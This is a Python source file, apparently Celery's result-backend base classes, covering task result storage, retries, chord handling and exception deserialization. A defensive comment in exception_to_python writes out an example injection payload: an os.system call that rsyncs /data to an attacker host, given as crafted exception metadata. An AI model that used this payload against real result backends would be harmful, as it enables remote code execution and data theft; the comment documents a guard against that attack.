"""Result backend base classes.

- :class:`BaseBackend` defines the interface.

- :class:`KeyValueStoreBackend` is a common base class
    using K/V semantics like _get and _put.
"""
import sys
import time
import warnings
from collections import namedtuple
from datetime import datetime, timedelta
from functools import partial
from weakref import WeakValueDictionary

from billiard.einfo import ExceptionInfo
from kombu.serialization import dumps, loads, prepare_accept_content
from kombu.serialization import registry as serializer_registry
from kombu.utils.encoding import bytes_to_str, ensure_bytes
from kombu.utils.url import maybe_sanitize_url

import celery.exceptions
from celery import current_app, group, maybe_signature, states
from celery._state import get_current_task
from celery.app.task import Context
from celery.exceptions import (BackendGetMetaError, BackendStoreError, ChordError, ImproperlyConfigured,
                               NotRegistered, SecurityError, TaskRevokedError, TimeoutError)
from celery.result import GroupResult, ResultBase, ResultSet, allow_join_result, result_from_tuple
from celery.utils.collections import BufferMap
from celery.utils.functional import LRUCache, arity_greater
from celery.utils.log import get_logger
from celery.utils.serialization import (create_exception_cls, ensure_serializable, get_pickleable_exception,
                                        get_pickled_exception, raise_with_context)
from celery.utils.time import get_exponential_backoff_interval

__all__ = ('BaseBackend', 'KeyValueStoreBackend', 'DisabledBackend')

EXCEPTION_ABLE_CODECS = frozenset({'pickle'})

logger = get_logger(__name__)

MESSAGE_BUFFER_MAX = 8192

pending_results_t = namedtuple('pending_results_t', (
    'concrete', 'weak',
))

E_NO_BACKEND = """
No result backend is configured.
Please see the documentation for more information.
"""

E_CHORD_NO_BACKEND = """
Starting chords requires a result backend to be configured.

Note that a group chained with a task is also upgraded to be a chord,
as this pattern requires synchronization.

Result backends that supports chords: Redis, Database, Memcached, and more.
"""


def unpickle_backend(cls, args, kwargs):
    """Return an unpickled backend."""
    return cls(*args, app=current_app._get_current_object(), **kwargs)


class _nulldict(dict):
    def ignore(self, *a, **kw):
        pass

    __setitem__ = update = setdefault = ignore


def _is_request_ignore_result(request):
    if request is None:
        return False
    return request.ignore_result


class Backend:
    READY_STATES = states.READY_STATES
    UNREADY_STATES = states.UNREADY_STATES
    EXCEPTION_STATES = states.EXCEPTION_STATES

    TimeoutError = TimeoutError

    #: Time to sleep between polling each individual item
    #: in `ResultSet.iterate`. as opposed to the `interval`
    #: argument which is for each pass.
    subpolling_interval = None

    #: If true the backend must implement :meth:`get_many`.
    supports_native_join = False

    #: If true the backend must automatically expire results.
    #: The daily backend_cleanup periodic task won't be triggered
    #: in this case.
    supports_autoexpire = False

    #: Set to true if the backend is persistent by default.
    persistent = True

    retry_policy = {
        'max_retries': 20,
        'interval_start': 0,
        'interval_step': 1,
        'interval_max': 1,
    }

    def __init__(self, app,
                 serializer=None, max_cached_results=None, accept=None,
                 expires=None, expires_type=None, url=None, **kwargs):
        self.app = app
        conf = self.app.conf
        self.serializer = serializer or conf.result_serializer
        (self.content_type,
         self.content_encoding,
         self.encoder) = serializer_registry._encoders[self.serializer]
        cmax = max_cached_results or conf.result_cache_max
        self._cache = _nulldict() if cmax == -1 else LRUCache(limit=cmax)

        self.expires = self.prepare_expires(expires, expires_type)

        # precedence: accept, conf.result_accept_content, conf.accept_content
        self.accept = conf.result_accept_content if accept is None else accept
        self.accept = conf.accept_content if self.accept is None else self.accept
        self.accept = prepare_accept_content(self.accept)

        self.always_retry = conf.get('result_backend_always_retry', False)
        self.max_sleep_between_retries_ms = conf.get('result_backend_max_sleep_between_retries_ms', 10000)
        self.base_sleep_between_retries_ms = conf.get('result_backend_base_sleep_between_retries_ms', 10)
        self.max_retries = conf.get('result_backend_max_retries', float("inf"))
        self.thread_safe = conf.get('result_backend_thread_safe', False)

        self._pending_results = pending_results_t({}, WeakValueDictionary())
        self._pending_messages = BufferMap(MESSAGE_BUFFER_MAX)
        self.url = url

    def as_uri(self, include_password=False):
        """Return the backend as an URI, sanitizing the password or not."""
        # when using maybe_sanitize_url(), "/" is added
        # we're stripping it for consistency
        if include_password:
            return self.url
        url = maybe_sanitize_url(self.url or '')
        return url[:-1] if url.endswith(':///') else url

    def mark_as_started(self, task_id, **meta):
        """Mark a task as started."""
        return self.store_result(task_id, meta, states.STARTED)

    def mark_as_done(self, task_id, result,
                     request=None, store_result=True, state=states.SUCCESS):
        """Mark task as successfully executed."""
        if (store_result and not _is_request_ignore_result(request)):
            self.store_result(task_id, result, state, request=request)
        if request and request.chord:
            self.on_chord_part_return(request, state, result)

    def mark_as_failure(self, task_id, exc,
                        traceback=None, request=None,
                        store_result=True, call_errbacks=True,
                        state=states.FAILURE):
        """Mark task as executed with failure."""
        if store_result:
            self.store_result(task_id, exc, state,
                              traceback=traceback, request=request)
        if request:
            # This task may be part of a chord
            if request.chord:
                self.on_chord_part_return(request, state, exc)
            # It might also have chained tasks which need to be propagated to,
            # this is most likely to be exclusive with being a direct part of a
            # chord but we'll handle both cases separately.
            #
            # The `chain_data` try block here is a bit tortured since we might
            # have non-iterable objects here in tests and it's easier this way.
            try:
                chain_data = iter(request.chain)
            except (AttributeError, TypeError):
                chain_data = tuple()
            for chain_elem in chain_data:
                # Reconstruct a `Context` object for the chained task which has
                # enough information to for backends to work with
                chain_elem_ctx = Context(chain_elem)
                chain_elem_ctx.update(chain_elem_ctx.options)
                chain_elem_ctx.id = chain_elem_ctx.options.get('task_id')
                chain_elem_ctx.group = chain_elem_ctx.options.get('group_id')
                # If the state should be propagated, we'll do so for all
                # elements of the chain. This is only truly important so
                # that the last chain element which controls completion of
                # the chain itself is marked as completed to avoid stalls.
                #
                # Some chained elements may be complex signatures and have no
                # task ID of their own, so we skip them hoping that not
                # descending through them is OK. If the last chain element is
                # complex, we assume it must have been uplifted to a chord by
                # the canvas code and therefore the condition below will ensure
                # that we mark something as being complete as avoid stalling.
                if (
                    store_result and state in states.PROPAGATE_STATES and
                    chain_elem_ctx.task_id is not None
                ):
                    self.store_result(
                        chain_elem_ctx.task_id, exc, state,
                        traceback=traceback, request=chain_elem_ctx,
                    )
                # If the chain element is a member of a chord, we also need
                # to call `on_chord_part_return()` as well to avoid stalls.
                if 'chord' in chain_elem_ctx.options:
                    self.on_chord_part_return(chain_elem_ctx, state, exc)
            # And finally we'll fire any errbacks
            if call_errbacks and request.errbacks:
                self._call_task_errbacks(request, exc, traceback)

    def _call_task_errbacks(self, request, exc, traceback):
        old_signature = []
        for errback in request.errbacks:
            errback = self.app.signature(errback)
            if not errback._app:
                # Ensure all signatures have an application
                errback._app = self.app
            try:
                if (
                        # Celery tasks type created with the @task decorator have
                        # the __header__ property, but Celery task created from
                        # Task class do not have this property.
                        # That's why we have to check if this property exists
                        # before checking is it partial function.
                        hasattr(errback.type, '__header__') and

                        # workaround to support tasks with bind=True executed as
                        # link errors. Otherwise, retries can't be used
                        not isinstance(errback.type.__header__, partial) and
                        arity_greater(errback.type.__header__, 1)
                ):
                    errback(request, exc, traceback)
                else:
                    old_signature.append(errback)
            except NotRegistered:
                # Task may not be present in this worker.
                # We simply send it forward for another worker to consume.
                # If the task is not registered there, the worker will raise
                # NotRegistered.
                old_signature.append(errback)

        if old_signature:
            # Previously errback was called as a task so we still
            # need to do so if the errback only takes a single task_id arg.
            task_id = request.id
            root_id = request.root_id or task_id
            g = group(old_signature, app=self.app)
            if self.app.conf.task_always_eager or request.delivery_info.get('is_eager', False):
                g.apply(
                    (task_id,), parent_id=task_id, root_id=root_id
                )
            else:
                g.apply_async(
                    (task_id,), parent_id=task_id, root_id=root_id
                )

    def mark_as_revoked(self, task_id, reason='',
                        request=None, store_result=True, state=states.REVOKED):
        exc = TaskRevokedError(reason)
        if store_result:
            self.store_result(task_id, exc, state,
                              traceback=None, request=request)
        if request and request.chord:
            self.on_chord_part_return(request, state, exc)

    def mark_as_retry(self, task_id, exc, traceback=None,
                      request=None, store_result=True, state=states.RETRY):
        """Mark task as being retries.

        Note:
            Stores the current exception (if any).
        """
        return self.store_result(task_id, exc, state,
                                 traceback=traceback, request=request)

    def chord_error_from_stack(self, callback, exc=None):
        app = self.app
        try:
            backend = app._tasks[callback.task].backend
        except KeyError:
            backend = self
        # We have to make a fake request since either the callback failed or
        # we're pretending it did since we don't have information about the
        # chord part(s) which failed. This request is constructed as a best
        # effort for new style errbacks and may be slightly misleading about
        # what really went wrong, but at least we call them!
        fake_request = Context({
            "id": callback.options.get("task_id"),
            "errbacks": callback.options.get("link_error", []),
            "delivery_info": dict(),
            **callback
        })
        try:
            self._call_task_errbacks(fake_request, exc, None)
        except Exception as eb_exc:  # pylint: disable=broad-except
            return backend.fail_from_current_stack(callback.id, exc=eb_exc)
        else:
            return backend.fail_from_current_stack(callback.id, exc=exc)

    def fail_from_current_stack(self, task_id, exc=None):
        type_, real_exc, tb = sys.exc_info()
        try:
            exc = real_exc if exc is None else exc
            exception_info = ExceptionInfo((type_, exc, tb))
            self.mark_as_failure(task_id, exc, exception_info.traceback)
            return exception_info
        finally:
            while tb is not None:
                try:
                    tb.tb_frame.clear()
                    tb.tb_frame.f_locals
                except RuntimeError:
                    # Ignore the exception raised if the frame is still executing.
                    pass
                tb = tb.tb_next

            del tb

    def prepare_exception(self, exc, serializer=None):
        """Prepare exception for serialization."""
        serializer = self.serializer if serializer is None else serializer
        if serializer in EXCEPTION_ABLE_CODECS:
            return get_pickleable_exception(exc)
        exctype = type(exc)
        return {'exc_type': getattr(exctype, '__qualname__', exctype.__name__),
                'exc_message': ensure_serializable(exc.args, self.encode),
                'exc_module': exctype.__module__}

    def exception_to_python(self, exc):
        """Convert serialized exception to Python exception."""
        if not exc:
            return None
        elif isinstance(exc, BaseException):
            if self.serializer in EXCEPTION_ABLE_CODECS:
                exc = get_pickled_exception(exc)
            return exc
        elif not isinstance(exc, dict):
            try:
                exc = dict(exc)
            except TypeError as e:
                raise TypeError(f"If the stored exception isn't an "
                                f"instance of "
                                f"BaseException, it must be a dictionary.\n"
                                f"Instead got: {exc}") from e

        exc_module = exc.get('exc_module')
        try:
            exc_type = exc['exc_type']
        except KeyError as e:
            raise ValueError("Exception information must include "
                             "the exception type") from e
        if exc_module is None:
            cls = create_exception_cls(
                exc_type, __name__)
        else:
            try:
                # Load module and find exception class in that
                cls = sys.modules[exc_module]
                # The type can contain qualified name with parent classes
                for name in exc_type.split('.'):
                    cls = getattr(cls, name)
            except (KeyError, AttributeError):
                cls = create_exception_cls(exc_type,
                                           celery.exceptions.__name__)
        exc_msg = exc.get('exc_message', '')

        # If the recreated exception type isn't indeed an exception,
        # this is a security issue. Without the condition below, an attacker
        # could exploit a stored command vulnerability to execute arbitrary
        # python code such as:
        # os.system("rsync /data attacker@192.168.56.100:~/data")
        # The attacker sets the task's result to a failure in the result
        # backend with the os as the module, the system function as the
        # exception type and the payload
        # rsync /data attacker@192.168.56.100:~/data
        # as the exception arguments like so:
        # {
        #   "exc_module": "os",
        #   "exc_type": "system",
        #   "exc_message": "rsync /data attacker@192.168.56.100:~/data"
        # }
        if not isinstance(cls, type) or not issubclass(cls, BaseException):
            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'
            raise SecurityError(
                f"Expected an exception class, got {fake_exc_type} with payload {exc_msg}")

        # XXX: Without verifying `cls` is actually an exception class,
        #      an attacker could execute arbitrary python code.
        #      cls could be anything, even eval().
        try:
            if isinstance(exc_msg, (tuple, list)):
                exc = cls(*exc_msg)
            else:
                exc = cls(exc_msg)
        except Exception as err:  # noqa
            exc = Exception(f'{cls}({exc_msg})')

        return exc

    def prepare_value(self, result):
        """Prepare value for storage."""
        if self.serializer != 'pickle' and isinstance(result, ResultBase):
            return result.as_tuple()
        return result

    def encode(self, data):
        _, _, payload = self._encode(data)
        return payload

    def _encode(self, data):
        return dumps(data, serializer=self.serializer)

    def meta_from_decoded(self, meta):
        if meta['status'] in self.EXCEPTION_STATES:
            meta['result'] = self.exception_to_python(meta['result'])
        return meta

    def decode_result(self, payload):
        return self.meta_from_decoded(self.decode(payload))

    def decode(self, payload):
        if payload is None:
            return payload
        payload = payload or str(payload)
        return loads(payload,
                     content_type=self.content_type,
                     content_encoding=self.content_encoding,
                     accept=self.accept)

    def prepare_expires(self, value, type=None):
        if value is None:
            value = self.app.conf.result_expires
        if isinstance(value, timedelta):
            value = value.total_seconds()
        if value is not None and type:
            return type(value)
        return value

    def prepare_persistent(self, enabled=None):
        if enabled is not None:
            return enabled
        persistent = self.app.conf.result_persistent
        return self.persistent if persistent is None else persistent

    def encode_result(self, result, state):
        if state in self.EXCEPTION_STATES and isinstance(result, Exception):
            return self.prepare_exception(result)
        return self.prepare_value(result)

    def is_cached(self, task_id):
        return task_id in self._cache

    def _get_result_meta(self, result,
                         state, traceback, request, format_date=True,
                         encode=False):
        if state in self.READY_STATES:
            date_done = datetime.utcnow()
            if format_date:
                date_done = date_done.isoformat()
        else:
            date_done = None

        meta = {
            'status': state,
            'result': result,
            'traceback': traceback,
            'children': self.current_task_children(request),
            'date_done': date_done,
        }

        if request and getattr(request, 'group', None):
            meta['group_id'] = request.group
        if request and getattr(request, 'parent_id', None):
            meta['parent_id'] = request.parent_id

        if self.app.conf.find_value_for_key('extended', 'result'):
            if request:
                request_meta = {
                    'name': getattr(request, 'task', None),
                    'args': getattr(request, 'args', None),
                    'kwargs': getattr(request, 'kwargs', None),
                    'worker': getattr(request, 'hostname', None),
                    'retries': getattr(request, 'retries', None),
                    'queue': request.delivery_info.get('routing_key')
                    if hasattr(request, 'delivery_info') and
                    request.delivery_info else None,
                }
                if getattr(request, 'stamps', None):
                    request_meta['stamped_headers'] = request.stamped_headers
                    request_meta.update(request.stamps)

                if encode:
                    # args and kwargs need to be encoded properly before saving
                    encode_needed_fields = {"args", "kwargs"}
                    for field in encode_needed_fields:
                        value = request_meta[field]
                        encoded_value = self.encode(value)
                        request_meta[field] = ensure_bytes(encoded_value)

                meta.update(request_meta)

        return meta

    def _sleep(self, amount):
        time.sleep(amount)

    def store_result(self, task_id, result, state,
                     traceback=None, request=None, **kwargs):
        """Update task state and result.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        result = self.encode_result(result, state)

        retries = 0

        while True:
            try:
                self._store_result(task_id, result, state, traceback,
                                   request=request, **kwargs)
                return result
            except Exception as exc:
                if self.always_retry and self.exception_safe_to_retry(exc):
                    if retries < self.max_retries:
                        retries += 1

                        # get_exponential_backoff_interval computes integers
                        # and time.sleep accept floats for sub second sleep
                        sleep_amount = get_exponential_backoff_interval(
                            self.base_sleep_between_retries_ms, retries,
                            self.max_sleep_between_retries_ms, True) / 1000
                        self._sleep(sleep_amount)
                    else:
                        raise_with_context(
                            BackendStoreError("failed to store result on the backend", task_id=task_id, state=state),
                        )
                else:
                    raise

    def forget(self, task_id):
        self._cache.pop(task_id, None)
        self._forget(task_id)

    def _forget(self, task_id):
        raise NotImplementedError('backend does not implement forget.')

    def get_state(self, task_id):
        """Get the state of a task."""
        return self.get_task_meta(task_id)['status']

    get_status = get_state  # XXX compat

    def get_traceback(self, task_id):
        """Get the traceback for a failed task."""
        return self.get_task_meta(task_id).get('traceback')

    def get_result(self, task_id):
        """Get the result of a task."""
        return self.get_task_meta(task_id).get('result')

    def get_children(self, task_id):
        """Get the list of subtasks sent by a task."""
        try:
            return self.get_task_meta(task_id)['children']
        except KeyError:
            pass

    def _ensure_not_eager(self):
        if self.app.conf.task_always_eager and not self.app.conf.task_store_eager_result:
            warnings.warn(
                "Results are not stored in backend and should not be retrieved when "
                "task_always_eager is enabled, unless task_store_eager_result is enabled.",
                RuntimeWarning
            )

    def exception_safe_to_retry(self, exc):
        """Check if an exception is safe to retry.

        Backends have to overload this method with correct predicates dealing with their exceptions.

        By default no exception is safe to retry, it's up to backend implementation
        to define which exceptions are safe.
        """
        return False

    def get_task_meta(self, task_id, cache=True):
        """Get task meta from backend.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        self._ensure_not_eager()
        if cache:
            try:
                return self._cache[task_id]
            except KeyError:
                pass
        retries = 0
        while True:
            try:
                meta = self._get_task_meta_for(task_id)
                break
            except Exception as exc:
                if self.always_retry and self.exception_safe_to_retry(exc):
                    if retries < self.max_retries:
                        retries += 1

                        # get_exponential_backoff_interval computes integers
                        # and time.sleep accept floats for sub second sleep
                        sleep_amount = get_exponential_backoff_interval(
                            self.base_sleep_between_retries_ms, retries,
                            self.max_sleep_between_retries_ms, True) / 1000
                        self._sleep(sleep_amount)
                    else:
                        raise_with_context(
                            BackendGetMetaError("failed to get meta", task_id=task_id),
                        )
                else:
                    raise

        if cache and meta.get('status') == states.SUCCESS:
            self._cache[task_id] = meta
        return meta

    def reload_task_result(self, task_id):
        """Reload task result, even if it has been previously fetched."""
        self._cache[task_id] = self.get_task_meta(task_id, cache=False)

    def reload_group_result(self, group_id):
        """Reload group result, even if it has been previously fetched."""
        self._cache[group_id] = self.get_group_meta(group_id, cache=False)

    def get_group_meta(self, group_id, cache=True):
        self._ensure_not_eager()
        if cache:
            try:
                return self._cache[group_id]
            except KeyError:
                pass

        meta = self._restore_group(group_id)
        if cache and meta is not None:
            self._cache[group_id] = meta
        return meta

    def restore_group(self, group_id, cache=True):
        """Get the result for a group."""
        meta = self.get_group_meta(group_id, cache=cache)
        if meta:
            return meta['result']

    def save_group(self, group_id, result):
        """Store the result of an executed group."""
        return self._save_group(group_id, result)

    def delete_group(self, group_id):
        self._cache.pop(group_id, None)
        return self._delete_group(group_id)

    def cleanup(self):
        """Backend cleanup."""

    def process_cleanup(self):
        """Cleanup actions to do at the end of a task worker process."""

    def on_task_call(self, producer, task_id):
        return {}

    def add_to_chord(self, chord_id, result):
        raise NotImplementedError('Backend does not support add_to_chord')

    def on_chord_part_return(self, request, state, result, **kwargs):
        pass

    def set_chord_size(self, group_id, chord_size):
        pass

    def fallback_chord_unlock(self, header_result, body, countdown=1,
                              **kwargs):
        kwargs['result'] = [r.as_tuple() for r in header_result]
        try:
            body_type = getattr(body, 'type', None)
        except NotRegistered:
            body_type = None

        queue = body.options.get('queue', getattr(body_type, 'queue', None))

        if queue is None:
            # fallback to default routing if queue name was not
            # explicitly passed to body callback
            queue = self.app.amqp.router.route(kwargs, body.name)['queue'].name

        priority = body.options.get('priority', getattr(body_type, 'priority', 0))
        self.app.tasks['celery.chord_unlock'].apply_async(
            (header_result.id, body,), kwargs,
            countdown=countdown,
            queue=queue,
            priority=priority,
        )

    def ensure_chords_allowed(self):
        pass

    def apply_chord(self, header_result_args, body, **kwargs):
        self.ensure_chords_allowed()
        header_result = self.app.GroupResult(*header_result_args)
        self.fallback_chord_unlock(header_result, body, **kwargs)

    def current_task_children(self, request=None):
        request = request or getattr(get_current_task(), 'request', None)
        if request:
            return [r.as_tuple() for r in getattr(request, 'children', [])]

    def __reduce__(self, args=(), kwargs=None):
        kwargs = {} if not kwargs else kwargs
        return (unpickle_backend, (self.__class__, args, kwargs))


class SyncBackendMixin:
    def iter_native(self, result, timeout=None, interval=0.5, no_ack=True,
                    on_message=None, on_interval=None):
        self._ensure_not_eager()
        results = result.results
        if not results:
            return

        task_ids = set()
        for result in results:
            if isinstance(result, ResultSet):
                yield result.id, result.results
            else:
                task_ids.add(result.id)

        yield from self.get_many(
            task_ids,
            timeout=timeout, interval=interval, no_ack=no_ack,
            on_message=on_message, on_interval=on_interval,
        )

    def wait_for_pending(self, result, timeout=None, interval=0.5,
                         no_ack=True, on_message=None, on_interval=None,
                         callback=None, propagate=True):
        self._ensure_not_eager()
        if on_message is not None:
            raise ImproperlyConfigured(
                'Backend does not support on_message callback')

        meta = self.wait_for(
            result.id, timeout=timeout,
            interval=interval,
            on_interval=on_interval,
            no_ack=no_ack,
        )
        if meta:
            result._maybe_set_cache(meta)
            return result.maybe_throw(propagate=propagate, callback=callback)

    def wait_for(self, task_id,
                 timeout=None, interval=0.5, no_ack=True, on_interval=None):
        """Wait for task and return its result.

        If the task raises an exception, this exception
        will be re-raised by :func:`wait_for`.

        Raises:
            celery.exceptions.TimeoutError:
                If `timeout` is not :const:`None`, and the operation
                takes longer than `timeout` seconds.
        """
        self._ensure_not_eager()

        time_elapsed = 0.0

        while 1:
            meta = self.get_task_meta(task_id)
            if meta['status'] in states.READY_STATES:
                return meta
            if on_interval:
                on_interval()
            # avoid hammering the CPU checking status.
            time.sleep(interval)
            time_elapsed += interval
            if timeout and time_elapsed >= timeout:
                raise TimeoutError('The operation timed out.')

    def add_pending_result(self, result, weak=False):
        return result

    def remove_pending_result(self, result):
        return result

    @property
    def is_async(self):
        return False


class BaseBackend(Backend, SyncBackendMixin):
    """Base (synchronous) result backend."""


BaseDictBackend = BaseBackend  # XXX compat


class BaseKeyValueStoreBackend(Backend):
    key_t = ensure_bytes
    task_keyprefix = 'celery-task-meta-'
    group_keyprefix = 'celery-taskset-meta-'
    chord_keyprefix = 'chord-unlock-'
    implements_incr = False

    def __init__(self, *args, **kwargs):
        if hasattr(self.key_t, '__func__'):  # pragma: no cover
            self.key_t = self.key_t.__func__  # remove binding
        super().__init__(*args, **kwargs)
        self._add_global_keyprefix()
        self._encode_prefixes()
        if self.implements_incr:
            self.apply_chord = self._apply_chord_incr

    def _add_global_keyprefix(self):
        """
        This method prepends the global keyprefix to the existing keyprefixes.

        This method checks if a global keyprefix is configured in `result_backend_transport_options` using the
        `global_keyprefix` key. If so, then it is prepended to the task, group and chord key prefixes.
        """
        global_keyprefix = self.app.conf.get('result_backend_transport_options', {}).get("global_keyprefix", None)
        if global_keyprefix:
            self.task_keyprefix = f"{global_keyprefix}_{self.task_keyprefix}"
            self.group_keyprefix = f"{global_keyprefix}_{self.group_keyprefix}"
            self.chord_keyprefix = f"{global_keyprefix}_{self.chord_keyprefix}"

    def _encode_prefixes(self):
        self.task_keyprefix = self.key_t(self.task_keyprefix)
        self.group_keyprefix = self.key_t(self.group_keyprefix)
        self.chord_keyprefix = self.key_t(self.chord_keyprefix)

    def get(self, key):
        raise NotImplementedError('Must implement the get method.')

    def mget(self, keys):
        raise NotImplementedError('Does not support get_many')

    def _set_with_state(self, key, value, state):
        return self.set(key, value)

    def set(self, key, value):
        raise NotImplementedError('Must implement the set method.')

    def delete(self, key):
        raise NotImplementedError('Must implement the delete method')

    def incr(self, key):
        raise NotImplementedError('Does not implement incr')

    def expire(self, key, value):
        pass

    def get_key_for_task(self, task_id, key=''):
        """Get the cache key for a task by id."""
        if not task_id:
            raise ValueError(f'task_id must not be empty. Got {task_id} instead.')
        return self._get_key_for(self.task_keyprefix, task_id, key)

    def get_key_for_group(self, group_id, key=''):
        """Get the cache key for a group by id."""
        if not group_id:
            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
        return self._get_key_for(self.group_keyprefix, group_id, key)

    def get_key_for_chord(self, group_id, key=''):
        """Get the cache key for the chord waiting on group with given id."""
        if not group_id:
            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
        return self._get_key_for(self.chord_keyprefix, group_id, key)

    def _get_key_for(self, prefix, id, key=''):
        key_t = self.key_t

        return key_t('').join([
            prefix, key_t(id), key_t(key),
        ])

    def _strip_prefix(self, key):
        """Take bytes: emit string."""
        key = self.key_t(key)
        for prefix in self.task_keyprefix, self.group_keyprefix:
            if key.startswith(prefix):
                return bytes_to_str(key[len(prefix):])
        return bytes_to_str(key)

    def _filter_ready(self, values, READY_STATES=states.READY_STATES):
        for k, value in values:
            if value is not None:
                value = self.decode_result(value)
                if value['status'] in READY_STATES:
                    yield k, value

    def _mget_to_results(self, values, keys, READY_STATES=states.READY_STATES):
        if hasattr(values, 'items'):
            # client returns dict so mapping preserved.
            return {
                self._strip_prefix(k): v
                for k, v in self._filter_ready(values.items(), READY_STATES)
            }
        else:
            # client returns list so need to recreate mapping.
            return {
                bytes_to_str(keys[i]): v
                for i, v in self._filter_ready(enumerate(values), READY_STATES)
            }

    def get_many(self, task_ids, timeout=None, interval=0.5, no_ack=True,
                 on_message=None, on_interval=None, max_iterations=None,
                 READY_STATES=states.READY_STATES):
        interval = 0.5 if interval is None else interval
        ids = task_ids if isinstance(task_ids, set) else set(task_ids)
        cached_ids = set()
        cache = self._cache
        for task_id in ids:
            try:
                cached = cache[task_id]
            except KeyError:
                pass
            else:
                if cached['status'] in READY_STATES:
                    yield bytes_to_str(task_id), cached
                    cached_ids.add(task_id)

        ids.difference_update(cached_ids)
        iterations = 0
        while ids:
            keys = list(ids)
            r = self._mget_to_results(self.mget([self.get_key_for_task(k)
                                                 for k in keys]), keys, READY_STATES)
            cache.update(r)
            ids.difference_update({bytes_to_str(v) for v in r})
            for key, value in r.items():
                if on_message is not None:
                    on_message(value)
                yield bytes_to_str(key), value
            if timeout and iterations * interval >= timeout:
                raise TimeoutError(f'Operation timed out ({timeout})')
            if on_interval:
                on_interval()
            time.sleep(interval)  # don't busy loop.
            iterations += 1
            if max_iterations and iterations >= max_iterations:
                break

    def _forget(self, task_id):
        self.delete(self.get_key_for_task(task_id))

    def _store_result(self, task_id, result, state,
                      traceback=None, request=None, **kwargs):
        meta = self._get_result_meta(result=result, state=state,
                                     traceback=traceback, request=request)
        meta['task_id'] = bytes_to_str(task_id)

        # Retrieve metadata from the backend, if the status
        # is a success then we ignore any following update to the state.
        # This solves a task deduplication issue because of network
        # partitioning or lost workers. This issue involved a race condition
        # making a lost task overwrite the last successful result in the
        # result backend.
        current_meta = self._get_task_meta_for(task_id)

        if current_meta['status'] == states.SUCCESS:
            return result

        try:
            self._set_with_state(self.get_key_for_task(task_id), self.encode(meta), state)
        except BackendStoreError as ex:
            raise BackendStoreError(str(ex), state=state, task_id=task_id) from ex

        return result

    def _save_group(self, group_id, result):
        self._set_with_state(self.get_key_for_group(group_id),
                             self.encode({'result': result.as_tuple()}), states.SUCCESS)
        return result

    def _delete_group(self, group_id):
        self.delete(self.get_key_for_group(group_id))

    def _get_task_meta_for(self, task_id):
        """Get task meta-data for a task by id."""
        meta = self.get(self.get_key_for_task(task_id))
        if not meta:
            return {'status': states.PENDING, 'result': None}
        return self.decode_result(meta)

    def _restore_group(self, group_id):
        """Get task meta-data for a task by id."""
        meta = self.get(self.get_key_for_group(group_id))
        # previously this was always pickled, but later this
        # was extended to support other serializers, so the
        # structure is kind of weird.
        if meta:
            meta = self.decode(meta)
            result = meta['result']
            meta['result'] = result_from_tuple(result, self.app)
            return meta

    def _apply_chord_incr(self, header_result_args, body, **kwargs):
        self.ensure_chords_allowed()
        header_result = self.app.GroupResult(*header_result_args)
        header_result.save(backend=self)

    def on_chord_part_return(self, request, state, result, **kwargs):
        if not self.implements_incr:
            return
        app = self.app
        gid = request.group
        if not gid:
            return
        key = self.get_key_for_chord(gid)
        try:
            deps = GroupResult.restore(gid, backend=self)
        except Exception as exc:  # pylint: disable=broad-except
            callback = maybe_signature(request.chord, app=app)
            logger.exception('Chord %r raised: %r', gid, exc)
            return self.chord_error_from_stack(
                callback,
                ChordError(f'Cannot restore group: {exc!r}'),
            )
        if deps is None:
            try:
                raise ValueError(gid)
            except ValueError as exc:
                callback = maybe_signature(request.chord, app=app)
                logger.exception('Chord callback %r raised: %r', gid, exc)
                return self.chord_error_from_stack(
                    callback,
                    ChordError(f'GroupResult {gid} no longer exists'),
                )
        val = self.incr(key)
        # Set the chord size to the value defined in the request, or fall back
        # to the number of dependencies we can see from the restored result
        size = request.chord.get("chord_size")
        if size is None:
            size = len(deps)
        if val > size:  # pragma: no cover
            logger.warning('Chord counter incremented too many times for %r',
                           gid)
        elif val == size:
            callback = maybe_signature(request.chord, app=app)
            j = deps.join_native if deps.supports_native_join else deps.join
            try:
                with allow_join_result():
                    ret = j(
                        timeout=app.conf.result_chord_join_timeout,
                        propagate=True)
            except Exception as exc:  # pylint: disable=broad-except
                try:
                    culprit = next(deps._failed_join_report())
                    reason = 'Dependency {0.id} raised {1!r}'.format(
                        culprit, exc,
                    )
                except StopIteration:
                    reason = repr(exc)

                logger.exception('Chord %r raised: %r', gid, reason)
                self.chord_error_from_stack(callback, ChordError(reason))
            else:
                try:
                    callback.delay(ret)
                except Exception as exc:  # pylint: disable=broad-except
                    logger.exception('Chord %r raised: %r', gid, exc)
                    self.chord_error_from_stack(
                        callback,
                        ChordError(f'Callback error: {exc!r}'),
                    )
            finally:
                deps.delete()
                self.client.delete(key)
        else:
            self.expire(key, self.expires)


class KeyValueStoreBackend(BaseKeyValueStoreBackend, SyncBackendMixin):
    """Result backend base class for key/value stores."""


class DisabledBackend(BaseBackend):
    """Dummy result backend."""

    _cache = {}  # need this attribute to reset cache in tests.

    def store_result(self, *args, **kwargs):
        pass

    def ensure_chords_allowed(self):
        raise NotImplementedError(E_CHORD_NO_BACKEND.strip())

    def _is_disabled(self, *args, **kwargs):
        raise NotImplementedError(E_NO_BACKEND.strip())

    def as_uri(self, *args, **kwargs):
        return 'disabled://'

    get_state = get_status = get_result = get_traceback = _is_disabled
    get_task_meta_for = wait_for = get_many = _is_disabled
